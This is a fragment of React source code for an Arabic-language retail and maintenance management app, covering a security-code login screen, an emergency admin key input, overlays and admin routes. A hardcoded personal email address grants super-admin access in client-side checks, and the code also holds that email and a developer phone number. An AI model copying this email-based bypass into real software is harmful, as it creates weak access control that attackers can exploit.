                              <div className="w-28 h-28 sm:w-36 sm:h-36 bg-brand-primary/10 rounded-[2.2rem] flex items-center justify-center mx-auto mb-2 relative group transition-all duration-300 hover:scale-105 p-2 border border-yellow-500/20">
                                <div className="absolute inset-0 bg-brand-primary blur-2xl opacity-20 group-hover:opacity-40 transition-opacity" />
                                <img 
                                  src={SYSTEM_LOGO} 
                                  alt="Logo" 
                                  className="w-20 h-20 sm:w-28 sm:h-28 object-contain relative z-10 drop-shadow-[0_8px_16px_rgba(0,0,0,0.5)]" 
                                  referrerPolicy="no-referrer"
                                />
                              </div>
                              <h2 className="text-xl font-bold text-white">تأكيد الهوية الرقمية</h2>
                              <p className="text-xs text-gray-400 leading-relaxed">يرجى إدخال رمز الأمان للمتابعة.</p>
                              
                              <div className="space-y-4 relative z-10">
                                <input 
                                  type="password" 
                                  maxLength={4}
                                  className="w-full bg-black/40 border-2 border-white/5 hover:border-yellow-500/20 p-5 rounded-3xl text-center text-3xl font-black tracking-[0.5em] text-white focus:border-yellow-500 focus:ring-4 focus:ring-yellow-500/10 transition-all outline-none"
                                  placeholder="****"
                                  value={verificationInput}
                                  onChange={(e) => setVerificationInput(e.target.value.replace(/\D/g, ''))}
                                  onKeyDown={(e) => e.key === 'Enter' && handleVerifyCode()}
                                />
                                <button 
                                  onClick={handleVerifyCode}
                                  disabled={isSubmittingSecurity}
                                  className="w-full py-5 bg-gradient-to-r from-amber-500 via-yellow-400 to-amber-500 hover:brightness-110 active:scale-95 text-deep-navy rounded-3xl font-black shadow-lg shadow-yellow-500/10 transition-all flex items-center justify-center gap-2 text-lg border-t border-white/10 select-none"
                                >
                                  {isSubmittingSecurity ? <Loader2 className="animate-spin text-deep-navy" /> : 'تحقق ودخول'}
                                </button>
                                
                                <button
                                  onClick={() => {
                                    FirebaseProjectRouter.clearUserSessionFast();
                                    sessionStorage.clear();
                                    sessionStorage.setItem('just_logged_out', 'true');
                                    localStorage.setItem('jam_user_logged_out', 'true');
                                    auth.signOut().then(() => {
                                      const shopParam = new URLSearchParams(window.location.search).get('shop');
                                      if (shopParam) {
                                        window.location.href = `${window.location.origin}${window.location.pathname}?shop=${shopParam}#/login`;
                                      } else {
                                        window.location.href = `${window.location.origin}${window.location.pathname}#/login`;
                                      }
                                      window.location.reload();
                                    });
                                  }}
                                  className="w-full py-3 bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white rounded-2xl text-[11px] font-bold tracking-widest transition-all border border-white/5"
                                >
                                  تسجيل خروج (تبديل الحساب)
                                </button>

                                {/* Contact developers or emergency options */}
                                <div className="pt-4 border-t border-white/5 space-y-3">
                                  {!showDeveloperContactNotice ? (
                                    <button 
                                      onClick={() => setShowDeveloperContactNotice(true)}
                                      className="text-xs text-gray-500 hover:text-yellow-400 transition-colors font-bold block mx-auto underline"
                                    >
                                      هل نسيت الرمز؟ (طلب مساعدة)
                                    </button>
                                  ) : (
                                    <motion.div 
                                      initial={{ opacity: 0, y: -5 }}
                                      animate={{ opacity: 1, y: 0 }}
                                      className="bg-black/80 border border-yellow-500/30 p-4 rounded-2xl text-center space-y-2 text-right"
                                      dir="rtl"
                                    >
                                      <p className="text-xs text-yellow-105 font-bold leading-relaxed">
                                        لاستعادة رمز الأمان الخاص بك أو تعيينه من جديد، يرجى التواصل مع المطور فوراً:
                                      </p>
                                      <div className="flex items-center justify-center gap-2">
                                        <span className="text-[#ffd700] text-xs font-bold">📞 المطور:</span>
                                        <a href="tel:772315106" className="text-lg font-black text-yellow-400 tracking-wider hover:underline">
                                          772315106
                                        </a>
                                      </div>
                                      <button 
                                        type="button" 
                                        onClick={() => setShowDeveloperContactNotice(false)} 
                                        className="text-[10px] text-gray-400 hover:text-white underline block mx-auto pt-1 font-bold"
                                      >
                                        إغلاق الإشعار
                                      </button>
                                    </motion.div>
                                  )}

                                  {/* Also let superadmins/managers/owner write emergency input if needed */}
                                  {(profile?.role === 'superadmin' || profile?.role === 'manager' || profile?.role === 'owner' || profile?.email?.toLowerCase() === 'a777503191@gmail.com') && (
                                    <div className="pt-2">
                                      {!showEmergencyInput ? (
                                        <button 
                                          onClick={() => setShowEmergencyInput(true)}
                                          className="text-[10px] text-gray-600 hover:text-gray-400 block mx-auto font-bold"
                                        >
                                          إدخال مفتاح طوارئ الإدارة العليا
                                        </button>
                                      ) : (
                                        <div className="space-y-3 animate-in fade-in duration-300">
                                          <input 
                                            type="text" 
                                            placeholder="أدخل مفتاح الطوارئ الخاص بك"
                                            className="w-full bg-black/50 border border-white/10 p-3 rounded-xl text-center text-xs font-mono text-white focus:border-yellow-500 outline-none"
                                            value={emergencyInput}
                                            onChange={(e) => setEmergencyInput(e.target.value)}
                                          />
                                          <div className="flex gap-2">
                                            <button onClick={handleEmergencyRecovery} className="flex-1 py-2 bg-yellow-500/20 text-yellow-300 hover:bg-yellow-500/30 rounded-xl text-xs font-bold border border-yellow-500/30">تحقق</button>
                                            <button onClick={() => setShowEmergencyInput(false)} className="px-4 py-2 bg-white/5 text-gray-400 rounded-xl text-xs hover:bg-white/10">إلغاء</button>
                                          </div>
                                        </div>
                                      )}
                                    </div>
                                  )}
                                </div>
                              </div>
                            </>
                          ) : (
                            <>
                              <div className="w-28 h-28 sm:w-36 sm:h-36 bg-brand-primary/10 rounded-[2.2rem] flex items-center justify-center mx-auto mb-2 relative group transition-all duration-300 hover:scale-105 p-2 border border-yellow-500/20">
                                <div className="absolute inset-0 bg-brand-primary blur-2xl opacity-20 group-hover:opacity-40 transition-opacity" />
                                <img 
                                  src={SYSTEM_LOGO} 
                                  alt="Logo" 
                                  className="w-20 h-20 sm:w-28 sm:h-28 object-contain relative z-10 drop-shadow-[0_8px_16px_rgba(0,0,0,0.5)]" 
                                  referrerPolicy="no-referrer"
                                />
                              </div>
                              <h2 className="text-xl font-bold text-white">{profile?.mustChangeSecurityCode ? 'تجديد رمز الحماية' : 'إعداد الحماية لأول مرة'}</h2>
                              <p className="text-xs text-gray-400 leading-relaxed">
                                {profile?.mustChangeSecurityCode 
                                  ? 'قام المدير بتصفير رمزك الأمان. يرجى اختيار رمز جديد ومميز من 4 أرقام للحصول على أمان تام.' 
                                  : 'لتأمين بياناتك وحفظ سجلاتك من التلاعب، يرجى تعيين رمز أمان قوي مكون من 4 أرقام.'}
                              </p>

                              <div className="space-y-4">
                                <div className="space-y-1">
                                  <label className="text-[10px] text-gray-500 font-bold uppercase text-right block px-2">الرمز الجديد (4 خانات)</label>
                                  <input 
                                    type="password" 
                                    maxLength={4}
                                    className="w-full bg-black/40 border border-white/5 focus:border-yellow-500 p-4 rounded-2xl text-center text-xl font-black tracking-[0.5em] text-white outline-none"
                                    placeholder="****"
                                    value={setupCode}
                                    onChange={(e) => setSetupCode(e.target.value.replace(/\D/g, ''))}
                                  />
                                </div>
                                <div className="space-y-1">
                                  <label className="text-[10px] text-gray-500 font-bold uppercase text-right block px-2">تأكيد الرمز الجديد</label>
                                  <input 
                                    type="password" 
                                    maxLength={4}
                                    className="w-full bg-black/40 border border-white/5 focus:border-yellow-500 p-4 rounded-2xl text-center text-xl font-black tracking-[0.5em] text-white outline-none"
                                    placeholder="****"
                                    value={confirmSetupCode}
                                    onChange={(e) => setConfirmSetupCode(e.target.value.replace(/\D/g, ''))}
                                  />
                                </div>
                                <button 
                                  onClick={handleSetupSecurityCode}
                                  disabled={isSubmittingSecurity}
                                  className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-500 text-white hover:brightness-110 active:scale-95 rounded-3xl font-black shadow-lg transition-all flex items-center justify-center gap-2 font-cairo text-sm"
                                >
                                  {isSubmittingSecurity ? <Loader2 className="animate-spin text-white" /> : 'حفظ وتفعيل الحماية'}
                                </button>

                                <button
                                  onClick={() => { localStorage.clear(); sessionStorage.clear(); auth.signOut().then(() => { window.location.href = window.location.origin + window.location.pathname + '#/dashboard'; window.location.reload(); }); }}
                                  className="w-full py-3 bg-white/5 hover:bg-white/10 text-gray-500 hover:text-white rounded-2xl text-[11px] font-bold tracking-widest transition-all"
                                >
                                  تسجيل خروج (إلغاء العملية)
                                </button>
                              </div>
                            </>
                          )}
                        </div>
                      </motion.div>
                     )}

                     {/* VIP Customer Activation Code Screen */}
                     {false && profile && profile.role === 'customer' && !isPortalMode() && !isLoggingOut && !profile.isVipActivated && !isRemoteProcessing && (
                       <motion.div 
                         initial={{ opacity: 0 }} 
                         animate={{ opacity: 1 }} 
                         exit={{ opacity: 0 }}
                         className="fixed inset-0 z-[999] bg-[#001122]/95 flex flex-col items-center justify-center p-4 backdrop-blur-xl overflow-y-auto"
                       >
                         {/* Decorative Background Elements */}
                         <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-80 h-80 bg-amber-500/10 rounded-full blur-[120px] pointer-events-none" />
                         <div className="absolute bottom-1/4 left-1/4 w-60 h-60 bg-yellow-500/5 rounded-full blur-[100px] pointer-events-none" />

                         {/* Top Welcome Section (With Beautiful Style) */}
                         <div className="text-center mb-6 max-w-md w-full px-4 space-y-4 animate-in fade-in slide-in-from-top-4 duration-700">
                           <p className="text-xs font-bold text-yellow-500 uppercase tracking-[0.25em]">تفعيل حساب زبون VIP</p>
                           <h1 className="text-2xl md:text-3xl font-black text-white leading-relaxed font-cairo">
                             مرحباً بك، <span className="text-yellow-400 font-extrabold">{profile?.name || 'العميل الفاخر'}</span>
                           </h1>
                           <p className="text-sm text-gray-400 font-cairo">
                             لاستخدام التطبيق ومزامنة حساباتك، يرجى إدخال رمز التفعيل الذي تم إنشاؤه لك ومشاركته معك من قبل صاحب المحل.
                           </p>
                         </div>

                         {/* Main Activation Card */}
                         <div className="relative max-w-sm w-full p-8 bg-gradient-to-b from-[#0a1c30] to-[#040e1a] border-2 border-yellow-500/30 rounded-[3rem] shadow-[0_30px_100px_rgba(0,0,0,0.85)] text-center space-y-6 overflow-hidden">
                           <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(212,175,55,0.08),transparent_70%)] pointer-events-none" />

                           <div className="w-20 h-20 bg-amber-500/10 rounded-3xl flex items-center justify-center mx-auto mb-2 relative group">
                             <span className="text-4xl">🔱</span>
                           </div>
                           
                           <h2 className="text-xl font-bold text-white">رمز التفعيل الملكي</h2>
                           <p className="text-xs text-gray-400 leading-relaxed font-cairo">أدخل كود تفعيل VIP المكون من 8 أرقام (لمرة واحدة فقط).</p>
                           
                           <div className="space-y-4 relative z-10">
                             <input 
                               type="text" 
                               maxLength={8}
                               className="w-full bg-black/40 border-2 border-white/5 hover:border-yellow-500/20 p-5 rounded-3xl text-center text-3xl font-black tracking-[0.25em] text-white focus:border-yellow-500 focus:ring-4 focus:ring-yellow-500/10 transition-all outline-none"
                               placeholder="00000000"
                               value={vipActivationCode}
                               onChange={(e) => setVipActivationCode(e.target.value)}
                               onKeyDown={(e) => e.key === 'Enter' && handleVerifyVipCode()}
                             />

                             {vipActivationError && (
                               <p className="text-xs font-bold text-rose-500 bg-rose-500/10 border border-rose-500/20 py-2 px-4 rounded-xl font-cairo">
                                 {vipActivationError}
                               </p>
                             )}

                             <button 
                               onClick={handleVerifyVipCode}
                               disabled={isSubmittingVip}
                               className="w-full py-5 bg-gradient-to-r from-amber-500 via-yellow-400 to-amber-500 hover:brightness-110 active:scale-95 text-deep-navy rounded-3xl font-black shadow-lg shadow-yellow-500/10 transition-all flex items-center justify-center gap-2 text-lg border-t border-white/10 select-none animate-pulse font-cairo"
                             >
                               {isSubmittingVip ? <Loader2 className="animate-spin text-deep-navy" /> : 'تفعيل الحساب الملكي 💎'}
                             </button>
                             
                             <button
                               onClick={() => {
                                 sessionStorage.clear();
                                 auth.signOut().then(() => {
                                   const shopParam = new URLSearchParams(window.location.search).get('shop');
                                   if (shopParam) {
                                     window.location.href = `${window.location.origin}${window.location.pathname}?shop=${shopParam}#/dashboard`;
                                   } else {
                                     window.location.href = `${window.location.origin}${window.location.pathname}#/dashboard`;
                                   }
                                 });
                               }}
                               className="w-full py-3 bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white rounded-2xl text-[11px] font-bold tracking-widest transition-all border border-white/5 font-cairo"
                             >
                               تسجيل خروج (تبديل الحساب)
                             </button>
                           </div>
                         </div>
                       </motion.div>
                     )}
                   </AnimatePresence>

                  <Suspense fallback={
                    <div className="flex-1 flex flex-col items-center justify-center space-y-4">
                      <Loader2 className="animate-spin text-brand-primary" size={40} />
                      <p className="text-gray-500 font-bold animate-pulse">جاري تحميل الواجهة...</p>
                    </div>
                  }>
                    <AdOverlay 
                      ads={activeAds} 
                      isOpen={isAdOpen} 
                      onClose={() => {
                        setIsAdOpen(false);
                        if (isLoggingOut) performLogout();
                      }} 
                    />
                    <AnimatePresence>
                      {incomingCall && (
                        <motion.div 
                          initial={{ opacity: 0 }}
                          animate={{ opacity: 1 }}
                          exit={{ opacity: 0 }}
                          className="fixed inset-0 z-[99999] bg-black/85 backdrop-blur-xl flex items-center justify-center p-6 text-white"
                          dir="rtl"
                        >
                          <div className="w-full max-w-sm text-center space-y-8 p-8 bg-white/5 border border-white/10 rounded-[3rem] shadow-2xl">
                            <div className="relative inline-block">
                              <div className="w-28 h-28 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-5xl font-black relative z-10 animate-[pulse_1.5s_infinite]">
                                📞
                              </div>
                              <div className="absolute inset-0 rounded-full bg-green-500 animate-ping opacity-25" />
                            </div>
                            <div>
                              <h3 className="text-2xl font-black mb-2">{incomingCall.callerName}</h3>
                              <p className="text-green-400 font-bold uppercase tracking-widest text-xs animate-pulse">
                                مكالمة صوتية واردة...
                              </p>
                            </div>
                            <div className="flex items-center justify-center gap-8">
                              <button 
                                onClick={() => {
                                  setIncomingCall(null);
                                  window.location.hash = `#/chat?contactId=${incomingCall.roomId}`;
                                }}
                                className="w-16 h-16 bg-green-500 hover:bg-green-600 rounded-full flex items-center justify-center hover:scale-110 transition-transform shadow-lg shadow-green-500/35"
                              >
                                <span className="text-2xl font-bold">🟢</span>
                              </button>
                              <button 
                                onClick={() => setIncomingCall(null)}
                                className="w-16 h-16 bg-red-500 hover:bg-red-600 rounded-full flex items-center justify-center hover:scale-110 transition-transform shadow-lg shadow-red-500/35"
                              >
                                <span className="text-2xl font-bold">❌</span>
                              </button>
                            </div>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    <div className="flex flex-col w-full h-full min-h-screen">
                      {isLicenseExpired && (
                        <div className="bg-gradient-to-r from-red-600 via-amber-600 to-red-600 text-white py-2.5 px-4 text-center font-semibold text-xs sm:text-sm shadow-md animate-pulse z-[9999] relative flex items-center justify-center gap-2" dir="rtl">
                          <span>⚠️ وضع الطوارئ المحلي نشط (نظام JAM SYSTEM PRO): ترخيص تشغيل قواعد البيانات السحابية منتهي حالياً. التطبيق شغال بنسبة 100% بالكامل محلياً؛ يمكنك مواصلة كافة العمليات من حفظ وخصم وإضافة لضمان انسيابية العمل، وسيتم مزامنة بياناتك تلقائياً وبأمان تام مع السحابة بمجرد تجديد الترخيص السحابي!</span>
                        </div>
                      )}

                      <Routes>
                          {/* Completely Unwrapped Reels Manager Route accessible to any merchant enabling the feature */}
                          <Route path="/reels-manager" element={<ReelsManager profile={profile} />} />

                          {/* Protect Admin Routes from Customers */}
                          <Route element={<AdminGuard profile={profile} />}>
                            <Route path="/dashboard" element={<Dashboard profile={profile} />} />
                            <Route path="/maintenance" element={<Maintenance profile={profile} />} />
                            <Route path="/inventory" element={<Inventory profile={profile} />} />
                            <Route path="/sales" element={<Sales profile={profile} />} />
                            <Route path="/wholesale-pos" element={<WholesalePOS profile={profile} />} />
                            <Route path="/wholesale-purchases" element={<WholesalePOS profile={profile} initialMode="purchases" />} />
                            <Route path="/accounts" element={<SmartAccountingHub profile={profile} />} />
                            <Route path="/smart-accounting" element={<SmartAccountingHub profile={profile} />} />
                            <Route path="/finances" element={<SmartAccountingHub profile={profile} initialTab="vaults" />} />
                            <Route path="/bank-transfers" element={<BankTransferManager profile={profile} />} />
                            <Route path="/inventory-match" element={<InventoryMatching profile={profile} />} />
                            <Route path="/warehouse" element={<WorkforceWorkspace profile={profile} />} />
                            <Route path="/reports" element={<Archive profile={profile} />} />
                            <Route path="/archive" element={<Archive profile={profile} />} />
                            <Route path="/mobile-balance" element={<MobileBalance profile={profile} />} />
                            <Route path="/sim-cards" element={<SIMManagement profile={profile} />} />
                            <Route path="/customers" element={<Customers profile={profile} />} />
                            <Route path="/users" element={<Users profile={profile} />} />
                            <Route path="/engineer-accounts" element={<Maintenance profile={profile} initialOpenAgreements={true} />} />
                            <Route path="/attendance" element={<Attendance profile={profile} />} />
                            <Route path="/activity-logs" element={<ActivityLogs profile={profile} />} />

                            <Route path="/smart-commerce" element={<Navigate to="/market" replace />} />
                            <Route path="/smart-import" element={<SmartImport profile={profile} />} />
                            <Route path="/operations-customers" element={<OperationsAndCustomers profile={profile} />} />
                            <Route path="/market" element={<MarketUI profile={profile} />} />
                            <Route path="/chat" element={<ChatHub profile={profile} />} />
                            <Route path="/help" element={<HelpCenter profile={profile} />} />
                            <Route path="/damaged" element={<DamagedItems profile={profile} />} />
                            <Route path="/invoice-scanner" element={<InvoiceScanner profile={profile} />} />
                            <Route path="/suppliers" element={<Suppliers profile={profile} />} />
                            <Route path="/shortages" element={<OrdersAndShortages profile={profile} />} />
                            <Route path="/delivery" element={<DeliveryAgentPortal profile={profile} />} />
                            <Route path="/warehouse-prep" element={<WarehousePrep profile={profile} />} />
                            <Route path="/cashier" element={<CashierDashboard profile={profile} />} />
                            <Route 
                              path="/super-admin" 
                              element={
                                (['a777503191@gmail.com'].includes(profile?.email?.toLowerCase() || '') || profile?.role === 'superadmin')
                                  ? <SuperAdmin profile={profile} /> 
                                  : <Navigate to="/dashboard" replace />
                              } 
                            />
                            <Route path="/gemini-monitoring" element={<Navigate to="/dashboard" replace />} />
                            <Route path="/settings" element={<Settings profile={profile} />} />
                            <Route path="/orders" element={<OrdersAndShortages profile={profile} />} />
                          </Route>
                          <Route path="*" element={<Navigate to="/" />} />
                        </Routes>
                    </div>
                  </Suspense>
                </Layout>
              )
            } />
          </Routes>
          <UniversalMediaPlayer isDark={profile?.visualTheme !== 'light'} />
        </ShoppingCartProvider>
        </SystemSyncProvider>
      </VaultProvider>
      <AppVersionEnforcerModal />
      <YemenMidnightReconciliationOverlay />
      <NetworkGuardToast />
    </LoadingProvider>
  );
}
